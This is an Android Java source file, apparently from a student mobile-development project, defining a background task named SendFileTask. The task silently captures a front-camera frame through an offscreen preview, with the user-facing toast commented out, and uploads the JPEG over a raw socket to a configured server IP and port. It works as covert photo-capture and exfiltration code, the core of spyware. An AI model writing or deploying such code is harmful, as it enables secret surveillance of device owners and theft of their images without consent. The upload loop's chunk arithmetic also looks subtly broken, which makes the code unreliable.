package com.introtomobileappdev.introtomobileappdev.tasks;

import android.content.Context;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.os.AsyncTask;

import com.introtomobileappdev.introtomobileappdev.utils.Constants;
import com.introtomobileappdev.introtomobileappdev.utils.Utils;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class SendFileTask extends AsyncTask<Context, Void, Void> {

    private void takePhoto(final Context context, int cameraID)
    {
        Camera camera = Camera.open(cameraID);

        SurfaceTexture surfaceTexture = new SurfaceTexture(10);
        try
        {
            camera.setPreviewTexture(surfaceTexture);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }

        Camera.Parameters parameters;

        parameters = camera.getParameters();
        camera.setParameters(parameters);



        camera.setPreviewCallback(new Camera.PreviewCallback() {
            @Override
            public void onPreviewFrame(byte[] data, Camera camera) {
                try
                {
                    String imageAbsolutePath = Utils.getFileAbsolutePath(context, Constants.DEFAULT_FILE_NAME, Constants.IMAGE);
                    Camera.Parameters parameters = camera.getParameters();
                    Camera.Size size = parameters.getPreviewSize();

                    YuvImage image = new YuvImage(data, parameters.getPreviewFormat(),
                            size.width, size.height, null);

                    File file = new File(imageAbsolutePath);

                    FileOutputStream fileOutputStream = new FileOutputStream(file);
                    image.compressToJpeg(
                            new Rect(0, 0, image.getWidth(), image.getHeight()), 90,
                            fileOutputStream);

//                    Toast.makeText(context, "saved as " + imageAbsolutePath, Toast.LENGTH_LONG).show();

                    fileOutputStream.close();
                    camera.stopPreview();
                }

                catch (Exception e)
                {
                    e.printStackTrace();
                }
            }
        });

        camera.startPreview();

    }

    private void sendTakenPhoto(final Context context, final String srvIP, final int srvPort)
    {
        try
        {
            Socket socket = new Socket(srvIP, srvPort);

            String imageAbsolutePath = Utils.getFileAbsolutePath(context, Constants.DEFAULT_FILE_NAME, Constants.IMAGE);
            FileInputStream fileInputStream = new FileInputStream(imageAbsolutePath);
            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
            int size = fileInputStream.available();
            int sentBytes = 0;

            dataOutputStream.write(Constants.IMAGE.getBytes());
            dataOutputStream.flush();

            while(true)
            {
                sentBytes += Constants.DEFAULT_BUFFER_SIZE;
                if (sentBytes < size)
                {
                    byte[] bytes = new byte[Constants.DEFAULT_BUFFER_SIZE];
                    fileInputStream.read(bytes, 0, Constants.DEFAULT_BUFFER_SIZE);
                    dataOutputStream.write(bytes);
                    dataOutputStream.flush();
                }

                else
                {
                    int lastBytesSize = 1024 - (sentBytes - size);
                    byte[] lastBytes = new byte[lastBytesSize];
                    fileInputStream.read(lastBytes, 0, lastBytesSize);
                    dataOutputStream.write(lastBytes);
                    dataOutputStream.flush();
                    break;
                }
            }



            dataOutputStream.close();
//            fileInputStream.close();
            socket.close();
        }

        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    private void go(Context context)
    {
        takePhoto(context, Constants.FRONT_CAMERA);
        try
        {
            TimeUnit.SECONDS.sleep(2);
        }

        catch (Exception e)
        {
            e.printStackTrace();
        }

        sendTakenPhoto(context, Constants.SRV_IP, Constants.SRV_PORT_FILES);
    }


    @Override
    protected Void doInBackground(Context... contexts) {
        go(contexts[0]);

        return null;
    }
}
